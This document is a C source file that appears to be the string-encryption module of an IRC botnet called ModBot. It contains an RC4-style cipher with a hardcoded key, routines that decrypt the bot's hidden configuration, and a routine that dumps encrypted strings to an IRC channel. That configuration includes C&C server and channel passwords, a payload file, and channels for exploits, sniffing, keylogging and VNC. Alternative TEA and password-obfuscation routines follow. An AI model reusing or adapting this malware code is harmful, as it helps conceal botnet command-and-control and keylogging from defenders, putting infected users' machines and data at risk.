/////////////////////////////////////////////////
//              120|-[ModBot]-V1.0             //
///////////////////////////////////////////////// 
#include "Inc.h"
#include "Fun.h"
#include "Ext.h"
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
void Crypt(TCHAR *inp, DWORD inplen, TCHAR* key, DWORD keylen)
{
	TCHAR Sbox[257], Sbox2[257], temp = 0 , k = 0;
	unsigned long i=0, j=0, t=0, x=0;
	TCHAR  OurUnSecuredKey[49]; 
	OurUnSecuredKey[0]=10; OurUnSecuredKey[1]=14; OurUnSecuredKey[2]=32; OurUnSecuredKey[3]=72;
	OurUnSecuredKey[4]=11; OurUnSecuredKey[5]=43; OurUnSecuredKey[6]=12; OurUnSecuredKey[7]=35;
	OurUnSecuredKey[8]=58; OurUnSecuredKey[9]=39; OurUnSecuredKey[10]=40; OurUnSecuredKey[11]=94;
	OurUnSecuredKey[12]=42; OurUnSecuredKey[13]=30; OurUnSecuredKey[14]=45; OurUnSecuredKey[15]=90;
	OurUnSecuredKey[16]=27; OurUnSecuredKey[17]=15; OurUnSecuredKey[18]=76; OurUnSecuredKey[19]=68;
	OurUnSecuredKey[20]=22; OurUnSecuredKey[21]=04; OurUnSecuredKey[22]=87; OurUnSecuredKey[23]=35;
	OurUnSecuredKey[24]=17; OurUnSecuredKey[25]=83; OurUnSecuredKey[26]=56; OurUnSecuredKey[27]=19;
	OurUnSecuredKey[28]=13; OurUnSecuredKey[29]=18; OurUnSecuredKey[30]=37; OurUnSecuredKey[31]=28;
	OurUnSecuredKey[32]=48; OurUnSecuredKey[33]=18; OurUnSecuredKey[34]=80; OurUnSecuredKey[35]=79;
	OurUnSecuredKey[36]=57; OurUnSecuredKey[37]=16; OurUnSecuredKey[38]=66; OurUnSecuredKey[39]=31;
	OurUnSecuredKey[40]=55; OurUnSecuredKey[41]=29; OurUnSecuredKey[42]=65; OurUnSecuredKey[43]=85;
	OurUnSecuredKey[44]=44; OurUnSecuredKey[45]=65; OurUnSecuredKey[46]=44; OurUnSecuredKey[47]=88;
	OurUnSecuredKey[48]=0;  
	unsigned int OurKeyLen = strlen(OurUnSecuredKey);  
	ZeroMemory(Sbox, sizeof(Sbox));
	ZeroMemory(Sbox2, sizeof(Sbox2));
	for(i = 0; i < 256U; i++)
		Sbox[i] = (TCHAR)i;
	if(keylen) {
		for(i = 0; i < 256U ; i++) {
			if(j == keylen)
				j = 0;
			Sbox2[i] = key[j++];
		}    
	} else {
		for(i = 0; i < 256U ; i++) {
			if(j == (unsigned long)OurKeyLen)
				j = 0;
			Sbox2[i] = OurUnSecuredKey[j++];
		}
	}
	j = 0 ;
	for(i = 0; i < 256; i++) {
		j = (j + (unsigned long) Sbox[i] + (unsigned long) Sbox2[i]) % 256U ;
		temp =  Sbox[i];                    
		Sbox[i] = Sbox[j];
		Sbox[j] =  temp;
	}

	i = j = 0;
	for(x = 0; x < inplen; x++) {
		i = (i + 1U) % 256U;
		j = (j + (unsigned long) Sbox[i]) % 256U;
		temp = Sbox[i];
		Sbox[i] = Sbox[j] ;
		Sbox[j] = temp;
		t = ((unsigned long) Sbox[i] + (unsigned long) Sbox[j]) %  256U ;
		k = Sbox[t];
		inp[x] = (char)(inp[x] ^ k);
	}    

	return;
}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_CRYPT 
void decryptstrings(int authsize, int versionsize)
{
	int i;

	Crypt(botid,strlen(botid),"",0);
	Crypt(version,strlen(version),"",0);
	Crypt(server,strlen(server),"",0);
	Crypt(serverpass,strlen(serverpass),"",0);
	Crypt(channel,strlen(channel),"",0);
	Crypt(chanpass,strlen(chanpass),"",0);
	Crypt(server2,strlen(server2),"",0);
	Crypt(channel2,strlen(channel2),"",0);
	Crypt(chanpass2,strlen(chanpass2),"",0);
	Crypt(filename,strlen(filename),"",0);
	Crypt(valuename,strlen(valuename),"",0);
	Crypt(nickconst,strlen(nickconst),"",0);
	Crypt(szLocalPayloadFile,strlen(szLocalPayloadFile),"",0);
	Crypt(modeonconn,strlen(modeonconn),"",0);
	Crypt(exploitchan,strlen(exploitchan),"",0);
	Crypt(sniffchan,strlen(sniffchan),"",0);
	Crypt(keylogchan,strlen(keylogchan),"",0);
	Crypt(vncchan,strlen(vncchan),"",0);
	Crypt(patchchan,strlen(patchchan),"",0);
	Crypt(keylogfile,strlen(keylogfile),"",0);

	for(i=0;i < authsize;i++)
		Crypt(authost[i],strlen(authost[i]),"",0);

	for(i=0;i < versionsize;i++)
		Crypt(versionlist[i],strlen(versionlist[i]),"",0);

	Crypt(regkey1,strlen(regkey1),"",0);
	Crypt(regkey2,strlen(regkey2),"",0);
	Crypt(regkey3,strlen(regkey3),"",0); 
	Crypt(regkey4,strlen(regkey4),"",0); 

	return;
};
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifdef DUMP_ENCRYPT
void encryptstring(char *str, char *varname, SOCKET sock, char *chan, BOOL notice)
{
	char buffer[IRCLINE];
	unsigned int counter=0;
	memset(buffer,0,sizeof(buffer));
	Crypt(str, strlen(str),"",0);

	sprintf(buffer,"char %s[]={",varname);
	for (unsigned int i=0; i < strlen(str); i++)
	{
		char tmpbuf[12];
		_snprintf(tmpbuf,sizeof(tmpbuf),"%d,", str[i]);
		counter+=strlen(tmpbuf);
		if (counter >= (IRCLINE-20)) {
			irc_privmsg(sock,chan,buffer,notice);
			memset(buffer,0,sizeof(buffer));	
			counter = 0;
		} 
		strncat(buffer,tmpbuf,strlen(tmpbuf));
	}
	strcat(buffer,"0};");
	irc_privmsg(sock,chan,buffer,notice, TRUE);
	Crypt(str, strlen(str),"",0);

	return;
}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
void encryptstrings(int authsize, int versionsize, SOCKET sock, char *chan, BOOL notice)
{
	char buffer[IRCLINE], sendbuf[IRCLINE];
	int i;
	
	encryptstring(botid,"botid",sock,chan,notice);
	encryptstring(version,"version",sock,chan,notice);
	encryptstring(password,"password",sock,chan,notice);	
	encryptstring(server,"server",sock,chan,notice);
	encryptstring(serverpass,"serverpass",sock,chan,notice);
	encryptstring(channel,"channel",sock,chan,notice);
	encryptstring(chanpass,"chanpass",sock,chan,notice);
	encryptstring(server2,"server2",sock,chan,notice);
	encryptstring(channel2,"channel2",sock,chan,notice);
	encryptstring(chanpass2,"chanpass2",sock,chan,notice);
	encryptstring(filename,"filename",sock,chan,notice);
	encryptstring(keylogfile,"keylogfile",sock,chan,notice);
	encryptstring(valuename,"valuename",sock,chan,notice);
	encryptstring(nickconst,"nickconst",sock,chan,notice);
	encryptstring(szLocalPayloadFile,"szLocalPayloadFile",sock,chan,notice);
	encryptstring(modeonconn,"modeonconn",sock,chan,notice);
	encryptstring(exploitchan,"exploitchan",sock,chan,notice);
	encryptstring(patchchan,"patchchan",sock,chan,notice);
	encryptstring(vncchan,"vncchan",sock,chan,notice);
	encryptstring(keylogchan,"keylogchan",sock,chan,notice);
	encryptstring(sniffchan,"sniffchan",sock,chan,notice);

	memset(buffer,0,sizeof(buffer));
	sprintf(buffer,"char *authost[]={");
	for(i=0;i < authsize;i++) {
		sprintf(sendbuf,"authost%d",i+1);
		encryptstring(authost[i],sendbuf,sock,chan,notice);
		strcat(buffer,sendbuf);strcat(buffer,",");
	}
	buffer[(strlen(buffer)-1)]='\0';
	strcat(buffer,"};");
	irc_privmsg(sock,chan,buffer,notice);

	memset(buffer,0,sizeof(buffer));
	sprintf(buffer,"char *versionlist[]={");
	for(i=0;i < versionsize;i++) {
		sprintf(sendbuf,"versionlist%d",i+1);
		encryptstring(versionlist[i],sendbuf,sock,chan,notice);
		strcat(buffer,sendbuf);strcat(buffer,",");
	}
	buffer[(strlen(buffer)-1)]='\0';
	strcat(buffer,"};");
	irc_privmsg(sock,chan,buffer,notice);

	encryptstring(regkey1,"regkey1",sock,chan,notice);
	encryptstring(regkey2,"regkey2",sock,chan,notice);
	encryptstring(regkey3,"regkey3",sock,chan,notice);
	encryptstring(regkey4,"regkey4",sock,chan,notice);

	return;
};
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifdef SIMPLE_CRYPT
char *decrypt(char *str,int key)
{
 	for (BYTE i = 0;str[i] != 0; i++)
		str[i] = str[i] - key;

	return (str);
}

char *encrypt(char *str,int key)
{
 	for (BYTE i = 0;str[i] != 0; i++)
		str[i] = str[i] - key;
     
	return (str);
}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifdef TEA_CRYPT
void encipher(const unsigned long *const v,unsigned long *const w,const unsigned long * const k)
{
	register unsigned long y=v[0],z=v[1],
		sum=0,delta=0x9E3779B9,n=32;

	while(n-->0) {
		y += (z << 4 ^ z >> 5) + z ^ sum + k[sum&3];
		sum += delta;
		z += (y << 4 ^ y >> 5) + y ^ sum + k[sum>>11 & 3];
	}

	w[0]=y; w[1]=z;

	return;
}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
void decipher(const unsigned long *const v,unsigned long *const w,const unsigned long * const k)
{
	register unsigned long y=v[0],z=v[1],
		sum=0xC6EF3720,delta=0x9E3779B9,n=32;

	/* sum = delta<<5, in general sum = delta * n */
	while(n-->0) {
		z -= (y << 4 ^ y >> 5) + y ^ sum + k[sum>>11 & 3];
		sum -= delta;
		y -= (z << 4 ^ z >> 5) + z ^ sum + k[sum&3];
	}
   
	w[0]=y; w[1]=z;

	return;
}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
void code(long *data, long *key) 
{
	unsigned long y = data[0], z = data[1],
		sum = 0, delta = 0x9e3779b9, n = 32;

	while (n-- > 0) {
		sum += delta;
		y += (z << 4) + (key[0]^z) + (sum^(z >> 5)) + key[1];
		z += (y << 4) + (key[2]^y) + (sum^(y >> 5)) + key[3];
	}
	data[0] = y;
	data[1] = z;

	return;
}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
void decode(long *data, long *key) 
{
	unsigned long n = 32, sum, y = data[0], z = data[1], delta=0x9e3779b9;

	sum = delta << 5;
	while (n-- > 0) {
		z -= (y << 4) + (key[2]^y) + (sum^(y >> 5)) + key[3]; 
		y -= (z << 4) + (key[0]^z) + (sum^(z >> 5)) + key[1];
		sum -= delta;  
	}
	data[0] = y; 
	data[1] = z;
	
	return;
}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
void codestr(char *datastr, char *keystr) 
{
	int i = 0, datasize;
	long *data = (long *)datastr;
	long *key = (long *)keystr;

	datasize = strlen(datastr) / sizeof(long);
	datasize = 0 ? 1 : datasize;
	while (i < datasize) {
		code(data, key);
		i += 2;
		data = (long *)datastr + i;
	}

	return;
}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
void decodestr(char *datastr, char *keystr) 
{
	int i = 0, datasize;
	long *data = (long *)datastr;
	long *key = (long *)keystr;

	datasize = strlen(datastr) / sizeof(long);
	datasize = 0 ? 1 : datasize;
	while (i < datasize) {
		decode(data, key);
		i += 2;
		data = (long *)datastr + i;
	}

	return;
}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifdef PLAIN_CRYPT
static unsigned char SixbitToChar[] =
	"1A2z3B4y5C6x7D8w9E0v$F_uGtHsIrJqKpLoMnNmOlPkQjRiShTgUfVeWdXcYbZa";
static unsigned char Mask[] = {0x00, 0x01, 0x03, 0x07, 0x0F, 0x1F, 0x3F};
char DecryptKey[]="9024jhdho39ehe2";
char *EncryptPassword(char *password, char *key)
{
	unsigned char rkey, checksum, c, *binary, *ascii, *keybuf;
	int keylen, passlen, i, j, unused, remainder;
  
	if (password == 0)
		return 0;
	passlen = strlen(password);
	if (key == 0)
		key = DecryptKey;
	keylen = strlen(key);
	keybuf = (unsigned char *) malloc(strlen(key)+1);
	strcpy((char *)keybuf, key);
  
	for (i=1; i < keylen; i++)
		keybuf[i] += keybuf[i-1];
  
	for (i=keylen-1; i >= 1; i--)
		keybuf[i-1] += keybuf[i];
	rkey = rand();
	rkey = SixbitToChar[rkey & 0x3F];
	checksum = 0;
	for (i=0 ; i<passlen; i++) {
		checksum += (password[i] >> 4) & 0x0F;  
		checksum += password[i] & 0x0F;        
	}
	binary = (unsigned char *)malloc(passlen+3);
	i=0;
	binary[i++] = rkey;
	binary[i++] = passlen;
	binary[i++] = checksum;
	while (*password)
		binary[i++] = *password++;
	passlen = passlen+3;

	for (i=1; i < passlen; i++) {
		binary[i] += keybuf[i % keylen];
		binary[i] += binary[i-1];
	}
	for (i=passlen-1; i >= 1; i--)
		binary[i-1] += binary[i];

	ascii = (unsigned char *)malloc(((passlen * 8) + 5) / 6 + 2);
  
	j=0;
	ascii[j++] = '!';
	ascii[j] = 0;
	unused = 6;
	for (i=0; i<passlen; i++) {
		c = binary[i];
		remainder = 8;
		while (remainder > 0) {
			unsigned int bits = (remainder < unused) ? remainder : unused;
			ascii[j] <<= bits;
			ascii[j] |= (c>>(8-bits)) & Mask[bits];
			unused -= bits;
			remainder -= bits;
			c <<= bits;     
			if (unused == 0) {
				ascii[j] = SixbitToChar[ascii[j]];
				ascii[++j] = 0;
				unused=6;
			}
		}
    }
	if (unused < 6) {
		ascii[j] <<= unused;
		ascii[j] = SixbitToChar[ascii[j]];
		j++;
	}
	ascii[j] = '\0';
	free(keybuf);
	free(binary);

	return ((char *)ascii);
}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
char *DecryptPassword(char *ascii, char *key)
{
	int keylen, asciilen, passlen, clearlen, i, j=0, k, needed, avail;
	unsigned char checksum, c, *binary, *keybuf;
	if (ascii == 0)
		return NULL;
	if (*ascii == 0 || *ascii != '!') {
		char *copy = (char*)malloc(strlen(ascii)+1);
		strcpy(copy, ascii);
		return copy;
	}
  	asciilen = strlen(ascii);
	if (key == 0)
		key = DecryptKey;
	keylen = strlen(key);
	if (keylen == 0)
		return NULL;
	keybuf = (unsigned char *)malloc(strlen(key)+1);
	strcpy((char *)keybuf, key);
  
	for (i=1; i < keylen; i++)
		keybuf[i] += keybuf[i-1];
  
	for (i=keylen-1; i >= 1; i--)
		keybuf[i-1] += keybuf[i];
	binary = (unsigned char *)malloc(asciilen);
	binary[j] = 0;
	needed = 8;
	for (i=1; i < asciilen; i++) {
		c = 0xFF;
		for (k=0 ; k<64 ; k++) {
			if (ascii[i] == SixbitToChar[k]) {
				c = k;
				break;
			}
		}
      
		if (c == 0xFF) {
			free(binary);
			return 0;
		}
      
		avail = 6;
		while (avail > 0) {
			unsigned int bits = (avail < needed) ? avail : needed;
			binary[j] <<= bits;
			binary[j] |= (c>>(6-bits)) & Mask[bits];
			c <<= bits;
			avail -= bits;
			needed -= bits;
	  
			if (needed == 0) {
				binary[++j] = 0;
				needed = 8;
			}
		}
	}
	clearlen = j;
	for (i=0; i < clearlen-1; i++)
		binary[i] -= binary[i+1];
	for (i=clearlen-1; i>=1; i--) {
		binary[i] -= binary[i-1];
		binary[i] -= keybuf[i % keylen];
	}
	if (binary[1] + 3 != clearlen) {
		free(binary);
		return 0;       
	}
	checksum = 0;
	for (i=0 ; i<binary[1]; i++) {
      checksum += (binary[i+3] >> 4) & 0x0F; 
      checksum += binary[i+3] & 0x0F;         
    }
	if (binary[2] != checksum) {
		free(binary);
		return 0;   
	}
	passlen = binary[1];
	for (i=0 ; i<passlen; i++)
		binary[i] = binary[i+3];
	binary[passlen] = '\0';
  
	return ((char *)binary);
}
#endif
/////////////////////////////////////////////////
//              120|-[ModBot]-V1.0             //
///////////////////////////////////////////////// 